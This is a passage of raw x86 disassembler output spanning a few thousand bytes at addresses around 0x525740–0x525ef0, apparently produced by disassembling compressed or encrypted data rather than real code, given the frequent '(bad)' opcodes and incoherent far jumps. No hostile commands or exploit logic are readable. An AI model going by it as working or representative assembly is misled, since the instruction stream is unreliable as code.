  52573f:	mov    al,0xa3
  525741:	shr    BYTE PTR [esi+esi*1],1
  525744:	jmp    0x37fefc3f
  525749:	mov    esp,0x6eec7a33
  52574e:	popa   
  52574f:	or     al,0xdf
  525751:	add    al,0x64
  525753:	inc    ecx
  525754:	xchg   ecx,eax
  525755:	push   ds
  525756:	dec    edi
  525757:	aad    0xba
  525759:	mov    eax,ds:0x79568335
  52575e:	jnp    0x525707
  525760:	sbb    BYTE PTR [eax],cl
  525762:	push   edi
  525763:	inc    esi
  525764:	retf   
  525765:	cmp    esi,ebx
  525767:	dec    ebp
  525768:	or     eax,0x4a870aaa
  52576d:	xor    ebx,DWORD PTR [ebx-0x40]
  525770:	aam    0x5e
  525772:	fucomi st,st(0)
  525774:	lods   al,BYTE PTR ds:[esi]
  525775:	cmc    
  525776:	mov    BYTE PTR [edx-0x735dae4d],ch
  52577c:	cmc    
  52577d:	(bad)
  525780:	in     eax,0x40
  525782:	les    ebx,FWORD PTR [ecx-0x19]
  525785:	stos   BYTE PTR es:[edi],al
  525786:	call   0xc05c:0xb9a5c071
  52578d:	sbb    ecx,DWORD PTR [esi+0x69]
  525790:	popf   
  525791:	jnp    0x5257f5
  525793:	(bad)  
  525795:	or     eax,DWORD PTR [edx+0xb]
  525798:	pop    edx
  525799:	(bad)  
  52579a:	clc    
  52579b:	dec    edi
  52579c:	sahf   
  52579d:	retf   
  52579e:	sbb    eax,0x22cc4aa
  5257a3:	mov    ds:0x2c366726,eax
  5257a8:	adc    DWORD PTR [esi+0x324c8bf0],ecx
  5257ae:	imul   ebx,DWORD PTR [esi+esi*4+0x4dca74fc],0x6dc40316
  5257b9:	adc    dl,dl
  5257bb:	test   BYTE PTR [edx],dh
  5257bd:	xchg   ebx,eax
  5257be:	push   ds
  5257bf:	addr16 pop ebx
  5257c1:	mov    eax,0x29c64293
  5257c6:	lds    esp,FWORD PTR [ecx]
  5257c8:	cmp    esp,ebx
  5257ca:	inc    esp
  5257cb:	enter  0x23ca,0x2e
  5257cf:	jne    0x52584d
  5257d1:	sar    edi,1
  5257d3:	xor    BYTE PTR [edx+0x5d],ch
  5257d6:	retf   
  5257d7:	cmp    eax,ebp
  5257d9:	retf   
  5257da:	outs   dx,DWORD PTR ds:[esi]
  5257db:	dec    ebx
  5257dc:	nop
  5257dd:	mov    ?,WORD PTR [ebp-0xcaddffc]
  5257e3:	sub    ebp,ecx
  5257e5:	loope  0x525808
  5257e7:	push   ds
  5257e8:	fadd   DWORD PTR [ecx+0x4f]
  5257eb:	mov    eax,ds:0xe469978f
  5257f0:	hlt    
  5257f1:	lea    ecx,ss:[ebx]
  5257f4:	jmp    esp
  5257f6:	pop    ebx
  5257f7:	or     ecx,DWORD PTR [edi]
  5257f9:	and    ecx,edi
  5257fb:	and    ecx,DWORD PTR [ecx+0x7f]
  5257fe:	sbb    cl,BYTE PTR [eax+ecx*4-0x20]
  525802:	icebp  
  525803:	xchg   ebx,eax
  525804:	cmc    
  525805:	sub    ebp,esp
  525807:	xchg   ebp,eax
  525808:	dec    ebx
  525809:	retf   0xf9e5
  52580c:	iret   
  52580d:	fst    QWORD PTR [esi+ecx*8]
  525810:	je     0x525832
  525812:	sub    DWORD PTR [ebp-0x1a],esp
  525815:	rcr    dh,1
  525817:	sub    DWORD PTR [eax],esi
  525819:	test   al,0x42
  52581b:	xor    ebx,DWORD PTR [ecx]
  52581d:	das    
  52581e:	in     al,dx
  52581f:	fldenv [esi+0x6006c604]
  525825:	mov    ch,0x50
  525827:	dec    ebp
  525828:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  525829:	mov    ch,0x1a
  52582b:	cmp    BYTE PTR [edx+0x7c42166d],bh
  525831:	repnz dec ebx
  525833:	into   
  525834:	(bad)  
  525835:	lods   eax,DWORD PTR ds:[esi]
  525836:	sbb    dh,BYTE PTR [edi-0xb]
  525839:	and    edi,edi
  52583b:	enter  0x8036,0x3a
  52583f:	mov    al,0xb2
  525841:	jg     0x52587f
  525843:	add    ebx,DWORD PTR [edi-0x7cbe38c4]
  525849:	popf   
  52584a:	mov    dl,0x34
  52584c:	sub    DWORD PTR [edx],ebx
  52584e:	dec    esp
  52584f:	stos   BYTE PTR es:[edi],al
  525850:	std    
  525851:	dec    ebp
  525852:	scas   eax,DWORD PTR es:[edi]
  525853:	mov    edx,0xfb6dfa9
  525858:	xchg   ecx,eax
  525859:	and    bl,BYTE PTR [edi]
  52585b:	mov    BYTE PTR [ebp-0x42],bh
  52585e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  52585f:	xor    DWORD PTR [ebp-0xdc8d7e5],esi
  525865:	jae    0x5257ec
  525867:	pop    edi
  525868:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  525869:	enter  0x989,0xc1
  52586d:	mov    WORD PTR [edi+0x66af5eb],fs
  525873:	pop    ds
  525874:	fs jle 0x5257f8
  525877:	jne    0x525817
  525879:	inc    esi
  52587a:	pop    ss
  52587b:	dec    ebx
  52587c:	jb     0x525884
  52587e:	and    al,0x7c
  525881:	mov    cl,0xf8
  525883:	push   ds
  525884:	fisttp DWORD PTR [ecx+0x6b]
  525887:	mov    ebp,0x381e581a
  52588c:	std    
  52588d:	sub    DWORD PTR [ebx],edi
  52588f:	mov    al,0xe
  525891:	mov    DWORD PTR [esi-0x4d218bb8],edi
  525897:	add    eax,0xa0420d35
  52589c:	or     DWORD PTR [bx+0x42f3],edx
  5258a1:	lds    ecx,FWORD PTR ds:[edx-0x62d1e798]
  5258a8:	xor    al,0xa5
  5258aa:	inc    edx
  5258ab:	xchg   BYTE PTR [edx+0x1abb17e1],dl
  5258b1:	scas   eax,DWORD PTR es:[edi]
  5258b2:	in     eax,dx
  5258b3:	mov    ebx,0xd9891f07
  5258b8:	pusha  
  5258b9:	jno    0x5258e1
  5258bb:	inc    eax
  5258bc:	mov    ebx,esp
  5258be:	mov    bh,0xee
  5258c0:	je     0x5258e3
  5258c2:	jo     0x525861
  5258c4:	add    BYTE PTR [edi+0x22],bl
  5258c7:	xchg   esi,eax
  5258c8:	cwde   
  5258c9:	out    dx,al
  5258ca:	retf   
  5258cb:	sub    BYTE PTR [eax],cl
  5258cd:	fst    QWORD PTR [ebx]
  5258cf:	call   0x4deb:0x3874f97f
  5258d6:	loopne 0x525894
  5258d8:	and    DWORD PTR [ecx-0x48],esi
  5258db:	loopne 0x5258a4
  5258dd:	mov    eax,ds:0x73588e53
  5258e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  5258e3:	cld    
  5258e4:	fild   QWORD PTR [edx+0x1a]
  5258e7:	and    eax,0x1bea2523
  5258ec:	add    DWORD PTR [edx+0x55],eax
  5258ef:	std    
  5258f0:	push   ebx
  5258f1:	jp     0x5258d2
  5258f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  5258f4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  5258f5:	or     eax,0x96b5e794
  5258fa:	sub    DWORD PTR [edx-0x3],edx
  5258fd:	jmp    0x5258b4
  5258ff:	test   al,0x12
  525901:	mov    ds:0x309c416,eax
  525906:	mov    cl,0x9
  525908:	mov    al,ds:0x1f86598e
  52590d:	mov    bh,0xfa
  52590f:	push   ebp
  525910:	retf   0x9161
  525913:	popa   
  525914:	sbb    esi,edx
  525916:	scas   eax,DWORD PTR es:[edi]
  525917:	rcr    BYTE PTR [ebx],cl
  525919:	(bad)  
  52591b:	inc    esp
  52591c:	pop    ebx
  52591d:	sub    DWORD PTR [esi-0x6a],ecx
  525920:	adc    ch,dl
  525922:	jb     0x525928
  525924:	das    
  525925:	dec    esi
  525926:	fcmovbe st,st(7)
  525928:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  525929:	out    0x20,eax
  52592b:	inc    DWORD PTR [eax-0x7e]
  52592e:	push   0xffffffd9
  525930:	retf   0x13be
  525933:	retf   
  525934:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  525935:	pop    ecx
  525936:	(bad)  
  525938:	push   eax
  525939:	mov    al,0x35
  52593b:	pushf  
  52593c:	and    ebx,esi
  52593e:	jns    0x52596b
  525940:	clc    
  525941:	cmp    dl,BYTE PTR [edx+0x6]
  525944:	aas    
  525945:	sbb    al,0x64
  525947:	cmp    esp,ebp
  525949:	fsubr  QWORD PTR [ebp-0x77fe63e0]
  52594f:	cwde   
  525950:	aad    0x25
  525952:	mov    ah,0x11
  525954:	adc    BYTE PTR [esp+ebx*1],ch
  525957:	sti    
  525958:	sbb    eax,0xe146cd62
  52595d:	(bad)  
  52595e:	aad    0xd5
  525960:	call   0xdef6:0x48ac20c0
  525967:	add    BYTE PTR [edi+0x2f],0x32
  52596b:	mov    al,0x83
  52596d:	cld    
  52596e:	mov    cl,0x8c
  525970:	adc    esp,DWORD PTR [esi-0x22a6a372]
  525976:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  525977:	lds    ebp,FWORD PTR [edx-0x75]
  52597a:	xor    esi,0x8dcf5238
  525980:	jns    0x52592f
  525982:	or     dh,cl
  525984:	(bad)  
  525985:	cmp    al,0x5c
  525987:	rol    BYTE PTR [ebp+ecx*8-0x60],0x7f
  52598c:	ins    DWORD PTR es:[edi],dx
  52598d:	dec    esi
  52598e:	sbb    BYTE PTR [ecx+esi*1+0x1379c3be],0x4
  525996:	mul    DWORD PTR [esi+edi*8-0x9]
  52599a:	mov    fs,esi
  52599c:	push   ebp
  52599d:	in     al,0x9b
  52599f:	pop    edx
  5259a0:	jo     0x525991
  5259a2:	hlt    
  5259a3:	mov    dh,0x63
  5259a5:	mov    esp,0x78d93e5
  5259aa:	shl    al,0xfe
  5259ad:	jb     0x5259ab
  5259af:	inc    eax
  5259b0:	imul   ebp,DWORD PTR [ecx],0x339df0c1
  5259b6:	xor    ebp,esi
  5259b8:	test   eax,0xef732036
  5259bd:	in     eax,0x20
  5259bf:	add    dh,al
  5259c1:	mov    esi,0x8b9b2d18
  5259c6:	push   ebp
  5259c7:	aas    
  5259c8:	leave  
  5259c9:	call   0x760b2e32
  5259ce:	add    edx,DWORD PTR [esi-0x751a290e]
  5259d4:	loop   0x52599a
  5259d6:	dec    ecx
  5259d7:	iret   
  5259d8:	inc    ecx
  5259d9:	jnp    0x525a30
  5259db:	es mov esp,0xbb23e671
  5259e1:	pop    ebx
  5259e2:	add    al,0xa1
  5259e4:	in     eax,dx
  5259e5:	adc    ecx,ebx
  5259e7:	cmp    eax,0x4f439f47
  5259ec:	(bad)  
  5259ed:	xor    eax,DWORD PTR [ecx-0x2a]
  5259f0:	(bad)  
  5259f1:	scas   eax,DWORD PTR es:[edi]
  5259f2:	jp     0x525a5a
  5259f4:	or     eax,0x59292f5d
  5259f9:	pop    es
  5259fa:	inc    esp
  5259fb:	xor    eax,0x5df2a993
  525a00:	mov    edi,0x56c6e253
  525a05:	or     eax,0xf7f38e7f
  525a0a:	pop    edi
  525a0b:	daa    
  525a0c:	daa    
  525a0d:	fcom   QWORD PTR [ebp-0x73dd78cb]
  525a13:	(bad)  
  525a14:	in     al,dx
  525a15:	ret    0x135e
  525a18:	hlt    
  525a19:	fs pushf 
  525a1b:	lods   eax,DWORD PTR ds:[esi]
  525a1c:	cdq    
  525a1d:	mov    ecx,0xa02474e2
  525a22:	rol    ecx,cl
  525a24:	mov    ds:0xd272dfc9,al
  525a29:	inc    edi
  525a2a:	retf   0xb4c6
  525a2d:	adc    BYTE PTR [eax-0x52],al
  525a30:	xor    ch,BYTE PTR [ecx+0x41]
  525a33:	inc    edi
  525a34:	out    dx,al
  525a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  525a36:	add    al,0xf6
  525a38:	sub    ch,bh
  525a3a:	cmp    DWORD PTR [eax],edi
  525a3c:	mov    cl,0x8a
  525a3e:	fstp   st(2)
  525a40:	mov    eax,0xc779a1c8
  525a45:	fsincos 
  525a47:	xlat   BYTE PTR ds:[ebx]
  525a48:	shr    BYTE PTR [ecx],0x63
  525a4b:	xchg   edx,eax
  525a4c:	adc    ecx,DWORD PTR [ebx+0x41]
  525a4f:	add    edx,ebp
  525a51:	jb     0x5259f0
  525a53:	in     eax,dx
  525a54:	push   ebx
  525a55:	push   ds
  525a56:	xlat   BYTE PTR ds:[ebx]
  525a58:	pop    ds
  525a59:	mov    dl,BYTE PTR [ecx-0x94b9dc0]
  525a5f:	popf   
  525a60:	dec    edi
  525a61:	arpl   WORD PTR [edi-0x69858034],di
  525a67:	adc    al,BYTE PTR [edi+0x59]
  525a6a:	shl    BYTE PTR [ebx],1
  525a6c:	or     eax,0xb3b5e40e
  525a71:	xchg   DWORD PTR [esi-0x6e],esp
  525a74:	cli    
  525a75:	mov    esi,0x3186353b
  525a7a:	jbe    0x525a79
  525a7c:	repz inc cx
  525a7f:	out    0xf5,al
  525a81:	sbb    eax,0x968a0ccc
  525a86:	outs   dx,DWORD PTR ds:[esi]
  525a87:	inc    eax
  525a88:	xor    eax,0x8b3fda17
  525a8d:	fild   QWORD PTR [ecx]
  525a8f:	psraw  mm5,QWORD PTR [esi-0x26]
  525a93:	fwait
  525a94:	aad    0x72
  525a96:	sti    
  525a97:	(bad)  
  525a99:	out    0x83,al
  525a9b:	push   ebx
  525a9c:	adc    ah,BYTE PTR [ecx]
  525a9e:	bound  edx,QWORD PTR [esi+0x3dd37481]
  525aa4:	add    eax,0x4ea74670
  525aa9:	outs   dx,BYTE PTR ds:[esi]
  525aaa:	inc    eax
  525aab:	mov    edi,0x439a82e
  525ab0:	cmc    
  525ab1:	pop    edx
  525ab2:	push   0x2b8bee27
  525ab7:	xchg   esp,eax
  525ab8:	or     DWORD PTR [ebx+0x5daaf100],esp
  525abe:	xchg   ecx,eax
  525abf:	mov    ebx,0x18dbea9c
  525ac4:	(bad)  
  525ac5:	mov    ebx,0xf42a2d16
  525aca:	imul   ebx,DWORD PTR [eax+0x6],0xfffffff2
  525ace:	aad    0x94
  525ad0:	sub    eax,0x9848b7c0
  525ad5:	out    dx,al
  525ad6:	sub    eax,0x7d332c0
  525adb:	cmp    ebp,DWORD PTR [edi]
  525add:	push   edi
  525ade:	pop    ebx
  525adf:	inc    eax
  525ae0:	cmc    
  525ae1:	sbb    ch,BYTE PTR [esp+edi*8]
  525ae4:	mov    dl,0x79
  525ae6:	cld    
  525ae7:	add    esi,DWORD PTR [edi]
  525ae9:	jmp    0x525a82
  525aeb:	mov    eax,0x1d8fc7a5
  525af0:	mov    bh,0x51
  525af2:	push   ss
  525af3:	arpl   dx,di
  525af5:	stos   BYTE PTR es:[edi],al
  525af6:	loop   0x525aab
  525af8:	mov    ebx,0x606a789e
  525afd:	adc    al,0xc0
  525aff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  525b00:	jno    0x525b56
  525b02:	jg     0x525b1b
  525b04:	mov    bh,0x4b
  525b06:	sub    DWORD PTR [eax+0x4e],eax
  525b09:	lock adc bl,dl
  525b0c:	pop    edi
  525b0d:	add    DWORD PTR [esp+eax*1],edi
  525b10:	sar    BYTE PTR [esi-0x271a5ab8],0x35
  525b17:	mov    eax,ds:0xb5485a67
  525b1c:	cmc    
  525b1d:	and    eax,DWORD PTR ds:0xf681db24
  525b23:	icebp  
  525b24:	mov    edx,0xadf335d0
  525b29:	and    BYTE PTR [eax-0x7],bh
  525b2c:	mov    WORD PTR [ecx],?
  525b2e:	dec    ebp
  525b2f:	pop    es
  525b30:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  525b31:	outs   dx,DWORD PTR ds:[esi]
  525b32:	out    dx,al
  525b33:	(bad)  
  525b34:	cli    
  525b35:	loope  0x525ba9
  525b37:	mov    esi,0x7ca6597c
  525b3c:	xlat   BYTE PTR ds:[ebx]
  525b3d:	sub    al,0xd1
  525b3f:	jl     0x525b1d
  525b41:	in     al,dx
  525b42:	dec    edx
  525b43:	popf   
  525b44:	jmp    0xc894:0x15ac357e
  525b4b:	and    al,0x85
  525b4d:	repnz out 0x1d,eax
  525b50:	sar    DWORD PTR [edi-0x5f7785e1],0x54
  525b57:	pop    ds
  525b58:	(bad)  
  525b59:	sti    
  525b5a:	xchg   esp,eax
  525b5b:	jno    0x525b08
  525b5d:	push   ecx
  525b5e:	repnz and al,0x30
  525b61:	cmp    al,0x3
  525b63:	mov    eax,0xa251b1c2
  525b68:	or     BYTE PTR [ebp+0x31a164a5],ah
  525b6e:	sub    al,0xf5
  525b70:	jmp    FWORD PTR [edx-0x15a854d0]
  525b76:	inc    ebp
  525b77:	add    edx,DWORD PTR [eax]
  525b79:	js     0x525bc2
  525b7b:	ds pop ecx
  525b7d:	call   0x4af368c6
  525b82:	scas   al,BYTE PTR es:[edi]
  525b83:	inc    ebx
  525b84:	mov    bh,0x35
  525b86:	cmp    eax,0x84b050d1
  525b8b:	jmp    0x47af5001
  525b90:	jp     0x525b2a
  525b92:	cmp    ch,BYTE PTR [ecx+0x18]
  525b95:	adc    BYTE PTR ds:0x47d19d1a,cl
  525b9b:	jp     0x525b4a
  525b9d:	xor    bh,BYTE PTR [ecx]
  525b9f:	lods   eax,DWORD PTR ds:[esi]
  525ba0:	fcmovnb st,st(5)
  525ba2:	or     ebp,DWORD PTR [ecx-0x66c13c21]
  525ba8:	cmp    BYTE PTR [eax-0x1855362d],dl
  525bae:	mov    ch,0xbf
  525bb0:	dec    esi
  525bb1:	push   esi
  525bb2:	sbb    ebx,esp
  525bb4:	jle    0x525b3d
  525bb6:	push   esi
  525bb7:	(bad)  
  525bb8:	retf   
  525bb9:	push   cs
  525bba:	mov    eax,0xeeaea43b
  525bbf:	mov    bl,0x9a
  525bc1:	inc    esp
  525bc2:	pushf  
  525bc3:	out    dx,al
  525bc4:	ret    0x874e
  525bc7:	fisub  WORD PTR [ebx]
  525bc9:	jg     0x525bcf
  525bcb:	cmp    bl,BYTE PTR ds:0x7b4250e0
  525bd1:	mov    esi,0x8cb42ff1
  525bd6:	cmp    BYTE PTR [edi+0x2ad97c4b],bh
  525bdc:	xor    DWORD PTR ds:0x1f90e076,ebp
  525be2:	jecxz  0x525b9e
  525be4:	not    edx
  525be6:	ss jmp 0x525bf3
  525be9:	or     dh,0x66
  525bec:	loop   0x525b78
  525bee:	and    al,0xe7
  525bf0:	cmp    al,0x1e
  525bf2:	scas   al,BYTE PTR es:[edi]
  525bf3:	xor    BYTE PTR [eax+0x3b26bb7e],bh
  525bf9:	add    DWORD PTR [ecx],esi
  525bfb:	outs   dx,DWORD PTR ds:[esi]
  525bfc:	(bad)  
  525bfe:	mov    cs,WORD PTR [edi+0x41de3e8d]
  525c04:	or     BYTE PTR [edi+esi*1-0x567342b3],bl
  525c0b:	cmc    
  525c0c:	sub    ebp,DWORD PTR [eax-0x26ecd28d]
  525c12:	inc    esi
  525c13:	cmp    DWORD PTR [edx],esi
  525c15:	enter  0x237f,0x78
  525c19:	les    edx,FWORD PTR [ebp+0x6ff40cef]
  525c1f:	mov    bl,0xde
  525c21:	xor    cl,BYTE PTR [ecx+0x7f7ed203]
  525c27:	nop
  525c28:	retf   0xea5f
  525c2b:	iret   
  525c2c:	sub    al,0xd3
  525c2e:	push   es
  525c2f:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  525c31:	inc    edx
  525c32:	xchg   edx,eax
  525c33:	mov    ds:0xab905c84,eax
  525c38:	mov    al,0xd1
  525c3a:	data16 and BYTE PTR [ebx+0x78],bh
  525c3e:	and    ebx,DWORD PTR [ebx+0x38]
  525c41:	add    BYTE PTR [ebx+0x172c6bcf],ah
  525c47:	ss dec ebp
  525c49:	mov    ebx,0xf38ae032
  525c4e:	sub    al,0x0
  525c50:	and    ch,ch
  525c52:	retf   0xd0c2
  525c55:	loopne 0x525c94
  525c57:	xor    bh,bh
  525c59:	popa   
  525c5a:	sub    DWORD PTR [ebx+ecx*8+0x58],esi
  525c5e:	aaa    
  525c5f:	dec    edx
  525c60:	xchg   esp,eax
  525c61:	(bad)  
  525c62:	(bad)  
  525c63:	jne    0x525cac
  525c65:	cmp    DWORD PTR [edi-0x14],ebx
  525c68:	jne    0x525c19
  525c6a:	icebp  
  525c6b:	add    eax,ecx
  525c6d:	fdivr  DWORD PTR [ebx-0x4f7fd6be]
  525c73:	push   esi
  525c74:	stc    
  525c75:	add    DWORD PTR [ebp+0x69],ebp
  525c78:	push   es
  525c79:	add    edx,DWORD PTR [eax+0xf]
  525c7c:	test   BYTE PTR [edx-0x501945ec],ah
  525c82:	imul   ebp,DWORD PTR [esi],0x75
  525c85:	mov    al,ds:0x19a05be5
  525c8a:	xor    ebx,DWORD PTR [edi]
  525c8c:	sbb    dh,BYTE PTR [edi]
  525c8e:	imul   edi,DWORD PTR [ecx],0x6d8adba7
  525c94:	mov    bh,0x37
  525c96:	(bad)  
  525c97:	sti    
  525c98:	push   cs
  525c99:	pop    ds
  525c9a:	cmp    ah,BYTE PTR [edx]
  525c9c:	jl     0x525c35
  525c9e:	fs loop 0x525cbf
  525ca1:	aad    0x1c
  525ca3:	add    ebx,DWORD PTR [ebp-0x30c5350b]
  525ca9:	jno    0x525c96
  525cab:	sub    DWORD PTR [edx+0x54],ebp
  525cae:	mov    DWORD PTR [edi+0x275b0cef],edi
  525cb4:	pop    ss
  525cb5:	or     eax,0x2125d4a9
  525cba:	jb     0x525c84
  525cbc:	push   eax
  525cbd:	aas    
  525cbe:	push   0xec7cec11
  525cc3:	dec    edx
  525cc4:	xor    eax,DWORD PTR [edx+0xa]
  525cc7:	adc    al,0xdd
  525cc9:	dec    esi
  525cca:	add    DWORD PTR [ebx+ecx*4],ecx
  525ccd:	popa   
  525cce:	aas    
  525ccf:	fdivr  DWORD PTR ds:0xe6b12ff3
  525cd5:	adc    BYTE PTR [edx+0x45],dh
  525cd8:	jbe    0x525c5c
  525cda:	jmp    0x525d1d
  525cdc:	push   ecx
  525cdd:	out    dx,eax
  525cde:	push   eax
  525cdf:	dec    esi
  525ce0:	rol    DWORD PTR [edi],1
  525ce2:	dec    esp
  525ce3:	or     esi,DWORD PTR [ebx]
  525ce5:	push   ds
  525ce6:	push   esp
  525ce7:	pop    eax
  525ce8:	les    edx,FWORD PTR [esi+0x73a820f0]
  525cee:	jmp    0x91fc:0x24d48d39
  525cf5:	test   eax,0xf8459aa4
  525cfa:	xchg   DWORD PTR [ecx],esp
  525cfc:	aam    0xc
  525cfe:	test   eax,0x38842343
  525d03:	and    ebx,DWORD PTR [edi]
  525d05:	(bad)  
  525d06:	stos   DWORD PTR es:[edi],eax
  525d07:	fwait
  525d08:	add    al,0xe5
  525d0a:	repnz mov cl,0x13
  525d0d:	mov    bh,0xc8
  525d0f:	iret   
  525d10:	int3   
  525d11:	pop    ss
  525d12:	xchg   esi,eax
  525d13:	mov    esi,0x2411178a
  525d18:	xchg   DWORD PTR [ebx-0x47],ebp
  525d1b:	ror    DWORD PTR [ecx+ebp*4-0x6e6951cb],0x37
  525d23:	mov    dh,0xd0
  525d25:	inc    ebp
  525d26:	in     eax,0x53
  525d28:	cwde   
  525d29:	mov    ecx,0x28c703d
  525d2e:	push   eax
  525d2f:	mov    ebx,0xd794acc1
  525d34:	and    BYTE PTR [edi],0x6d
  525d37:	cmp    al,0x49
  525d39:	rcr    dh,0x18
  525d3c:	push   esi
  525d3d:	pop    edx
  525d3e:	test   al,0xec
  525d40:	in     eax,0x6a
  525d42:	ins    DWORD PTR es:[edi],dx
  525d43:	jp     0x525d48
  525d45:	add    ch,BYTE PTR [eax]
  525d47:	push   ebp
  525d48:	or     eax,ebp
  525d4a:	popa   
  525d4b:	push   0xffffffab
  525d4d:	popf   
  525d4e:	(bad)  
  525d4f:	in     eax,0x3d
  525d51:	arpl   WORD PTR [ebx+0x75],di
  525d54:	sbb    eax,0x17ead288
  525d59:	fwait
  525d5a:	push   cs
  525d5b:	sbb    bh,dh
  525d5d:	adc    eax,0xb339396a
  525d62:	jle    0x525dcd
  525d64:	and    cl,BYTE PTR [esi-0x4b7c19c4]
  525d6a:	mov    edx,0xc526c933
  525d6f:	mov    ah,0x18
  525d71:	scas   eax,DWORD PTR es:[edi]
  525d72:	bound  eax,QWORD PTR ds:0xb1d207d0
  525d78:	mov    ah,0x46
  525d7a:	ds push esi
  525d7c:	or     ch,BYTE PTR [ebx-0xd]
  525d7f:	aas    
  525d80:	bound  edx,QWORD PTR [ecx-0x3b]
  525d83:	mov    bl,0x86
  525d85:	inc    ebp
  525d86:	push   ds
  525d87:	dec    ebp
  525d88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  525d89:	loope  0x525de6
  525d8b:	xor    al,0xa8
  525d8d:	fidiv  WORD PTR [ebx-0x65877253]
  525d93:	xlat   BYTE PTR ds:[ebx]
  525d94:	pop    ecx
  525d95:	mov    dh,0xab
  525d97:	xchg   edx,eax
  525d98:	xor    dh,BYTE PTR [edi]
  525d9a:	(bad)  
  525d9c:	add    ebp,DWORD PTR [ecx-0x27]
  525d9f:	jbe    0x525dcf
  525da1:	dec    ecx
  525da2:	aas    
  525da3:	test   al,0x15
  525da5:	adc    esi,DWORD PTR [edi+ebp*4]
  525da8:	adc    BYTE PTR [eax+0x10cb2ff0],cl
  525dae:	fcmovnb st,st(2)
  525db0:	push   ebx
  525db1:	rcl    DWORD PTR cs:[edx],1
  525db4:	(bad)  
  525db6:	ucomiss xmm2,DWORD PTR [ecx]
  525db9:	cmp    eax,0xf2bcad2f
  525dbe:	sub    esi,DWORD PTR [esi+0x4c9c540d]
  525dc4:	dec    eax
  525dc5:	enter  0x4fb,0x31
  525dc9:	std    
  525dca:	leave  
  525dcb:	push   ebp
  525dcc:	or     BYTE PTR [edx],bl
  525dce:	xor    eax,0xb05f8ac0
  525dd3:	out    0x58,al
  525dd5:	dec    edi
  525dd6:	call   0x9430:0x377a53c2
  525ddd:	(bad)  
  525dde:	sbb    eax,0xde6bbb0a
  525de3:	adc    BYTE PTR [esp+eax*1+0x70],al
  525de7:	xchg   esi,eax
  525de8:	mov    edi,0x6af4eedd
  525ded:	(bad)  
  525dee:	stc    
  525def:	rcl    bh,cl
  525df1:	or     edx,DWORD PTR [ecx]
  525df3:	frstpm(287 only) 
  525df5:	xor    eax,0xe2b2def
  525dfa:	xchg   edi,eax
  525dfb:	aaa    
  525dfc:	add    al,0x20
  525dfe:	(bad)  
  525dff:	stc    
  525e00:	hlt    
  525e01:	pop    eax
  525e02:	cli    
  525e03:	(bad)  
  525e04:	jmp    0x4277:0x73b16501
  525e0b:	mov    edi,0x9c805437
  525e10:	(bad)  
  525e12:	or     al,0x49
  525e14:	inc    ebx
  525e15:	jbe    0x525dd0
  525e17:	jg     0x525e88
  525e19:	add    ebp,DWORD PTR [ecx]
  525e1b:	or     edx,DWORD PTR [edi-0x79]
  525e1e:	sub    eax,0xdc8cc2c4
  525e23:	or     dh,BYTE PTR [ebx+0x62a8999b]
  525e29:	mov    eax,ds:0x4b6f88ce
  525e2e:	pop    edx
  525e2f:	scas   eax,DWORD PTR es:[edi]
  525e30:	pop    ebx
  525e31:	pop    es
  525e32:	xchg   esp,eax
  525e33:	fwait
  525e34:	sbb    al,0x3b
  525e36:	pop    ebx
  525e37:	jo     0x525e0a
  525e39:	push   eax
  525e3a:	jae    0x525deb
  525e3c:	pop    es
  525e3d:	sub    eax,0xda32d67b
  525e42:	in     eax,0x2c
  525e44:	fmul   QWORD PTR [ebp+esi*4-0x1330ca3]
  525e4b:	in     al,0x1f
  525e4d:	repnz push ss
  525e4f:	shr    BYTE PTR [ebx-0x61],0xf4
  525e53:	mov    esp,0x19c2ed1a
  525e58:	aas    
  525e59:	test   BYTE PTR [edx],cl
  525e5b:	xchg   ebp,eax
  525e5c:	and    eax,0xa9c0ca67
  525e61:	popa   
  525e62:	xor    BYTE PTR [esi],bl
  525e64:	jb     0x525ec6
  525e66:	xor    ebx,DWORD PTR [ecx+0x16]
  525e69:	or     BYTE PTR [eax-0x695dc29f],cl
  525e6f:	mul    DWORD PTR [ecx]
  525e71:	mov    edx,0xfb036d19
  525e76:	iret   
  525e77:	sub    ebx,ecx
  525e79:	cmp    DWORD PTR [eax+0x55],0x8acd484c
  525e80:	mov    eax,0x660f2e5d
  525e85:	popf   
  525e86:	fwait
  525e87:	inc    edi
  525e88:	mov    ebx,ebx
  525e8a:	xchg   edi,eax
  525e8b:	pop    ecx
  525e8c:	push   es
  525e8d:	jo     0x525e4c
  525e8f:	lahf   
  525e90:	add    al,0x5a
  525e92:	mov    ah,ch
  525e94:	adc    BYTE PTR ds:0x91083237,0x2
  525e9b:	mov    cl,BYTE PTR [ebp+eiz*2+0x5e]
  525e9f:	daa    
  525ea0:	inc    esp
  525ea1:	enter  0x2186,0xf1
  525ea5:	dec    esp
  525ea6:	sbb    edi,DWORD PTR [edx+eax*8-0x710aec28]
  525ead:	adc    cl,BYTE PTR [eax-0xedd277c]
  525eb3:	and    DWORD PTR [ebp-0x2331bf8f],0x5f6dfce4
  525ebd:	jmp    0x821e8410
  525ec2:	jle    0x525e83
  525ec4:	repz mov dl,0xf8
  525ec7:	adc    al,0x95
  525ec9:	sub    BYTE PTR [ecx+0x12],0x5d
  525ecd:	fidiv  WORD PTR [esi+0x66]
  525ed0:	nop
  525ed1:	push   ebx
  525ed2:	and    DWORD PTR [ebx+eiz*4+0x75e20f1c],0xffffffb1
  525eda:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  525edb:	ror    BYTE PTR [eax-0x50c14bdf],1
  525ee1:	push   ebx
  525ee2:	div    BYTE PTR [edx]
  525ee4:	dec    edi
  525ee5:	push   eax
  525ee6:	xor    eax,esp
  525ee8:	loope  0x525edb
  525eea:	loop   0x525f3d
  525eec:	ja     0x525f17
  525eee:	inc    ecx
  525eef:	shr    bl,1
